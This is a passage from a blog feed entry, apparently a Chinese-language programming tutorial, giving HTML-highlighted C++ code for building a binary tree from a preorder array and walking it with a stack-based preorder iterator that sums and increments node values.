class="literal">NULL</span>;</span><br><span class="line">root-&gt;val = num[(*index)++];</span><br><span class="line"></span><br><span class="line">root-&gt;left = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">root-&gt;right = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树迭代器"><a href="#二叉树迭代器" class="headerlink" title="二叉树迭代器"></a>二叉树迭代器</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构建二叉树的迭代器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTreeIterator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 先存放二叉树的根节点</span></span><br><span class="line"><span class="built_in">BinaryTreeIterator</span>(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (root)</span><br><span class="line">&#123;</span><br><span class="line">st.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载*，返回当前位置的节点</span></span><br><span class="line">TreeNode*&amp; <span class="keyword">operator</span>*()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载++， 按照前序遍历的方式遍历二叉树</span></span><br><span class="line">BinaryTreeIterator&amp; <span class="keyword">operator</span>++()</span><br><span class="line">&#123;</span><br><span class="line">TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (node-&gt;right)st.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line"><span class="keyword">if</span> (node-&gt;left)st.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> BinaryTreeIterator&amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> !st.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">stack&lt;TreeNode*&gt; st;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 树节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>* left, * right;</span><br><span class="line">&#125;TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树的迭代器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTreeIterator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 先存放二叉树的根节点</span></span><br><span class="line"><span class="built_in">BinaryTreeIterator</span>(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (root)</span><br><span class="line">&#123;</span><br><span class="line">st.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载*，返回当前位置的节点</span></span><br><span class="line">TreeNode*&amp; <span class="keyword">operator</span>*()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> st.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照前序遍历的方式遍历二叉树</span></span><br><span class="line">BinaryTreeIterator&amp; <span class="keyword">operator</span>++()</span><br><span class="line">&#123;</span><br><span class="line">TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (node-&gt;right)st.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line"><span class="keyword">if</span> (node-&gt;left)st.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> BinaryTreeIterator&amp; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> !st.<span class="built_in">empty</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">stack&lt;TreeNode*&gt; st;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉树类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">BinaryTree</span>() &#123;&#125;</span><br><span class="line"><span class="comment">// 二叉树构造函数</span></span><br><span class="line"><span class="built_in">BinaryTree</span>(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span><br><span class="line">&#123;</span><br><span class="line">root = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树函数</span></span><br><span class="line"><span class="function">TreeNode* <span class="title">creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addFive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(BinaryTreeIterator it = <span class="built_in">begin</span>(); it != <span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">(*it)-&gt;val += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">TreeNode* root;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//前序遍历和此顺序一样，-1代表节点为空</span></span><br><span class="line"><span class="type">int</span> num[] = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">8</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">42</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">33</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">31</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> numSize = <span class="built_in">sizeof</span>(num) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 以root为根节点创建二叉树对象</span></span><br><span class="line"><span class="function">BinaryTree <span class="title">tree</span><span class="params">(num, numSize, &amp;index)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 利用 二叉树迭代器 遍历二叉树</span></span><br><span class="line"><span class="keyword">for</span> (BinaryTreeIterator it = tree.<span class="built_in">begin</span>(); it != tree.<span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (*it)-&gt;val &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">sum += (*it)-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;sum : &quot;</span> &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line"><span class="comment">// 用accumulate函数验证</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;accumulate值 : &quot;</span> &lt;&lt; <span class="built_in">accumulate</span>(tree.<span class="built_in">begin</span>(), tree.<span class="built_in">end</span>(), <span class="number">0</span>, [](<span class="type">int</span> sum, BinaryTreeIterator a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> sum + (*a)-&gt;val;</span><br><span class="line">&#125;) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二叉树所有节点+5</span></span><br><span class="line">tree.<span class="built_in">addFive</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;所有节点+5后 :&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (BinaryTreeIterator it = tree.<span class="built_in">begin</span>(); it != tree.<span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (*it)-&gt;val &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">BinaryTree::creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//如果数组当前值为-1，空节点</span></span><br><span class="line"><span class="keyword">if</span> (num[(*index)] == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">(*index)++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">TreeNode* root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((*index) &lt; numSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//否则新建节点</span></span><br><span class="line">root = (TreeNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存分配失败!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;val = num[(*index)++];</span><br><span class="line"></span><br><span class="line">root-&gt;left = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">root-&gt;right = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二叉树迭代器（前序遍历）&quot;&gt;&lt;a href=&quot;#二叉树迭代器（前序遍历）&quot; class=&quot;headerlink&quot; title=&quot;二叉树迭代器（前序遍历）&quot;&gt;&lt;/a&gt;二叉树迭代器（前序遍历）&lt;/h2&gt;&lt;h3 id=&quot;定义树节点&quot;&gt;&lt;a href=&quot;#定义树节点&quot; c</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
    <category term="二叉树" scheme="https://1xueyu1.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
</feed>
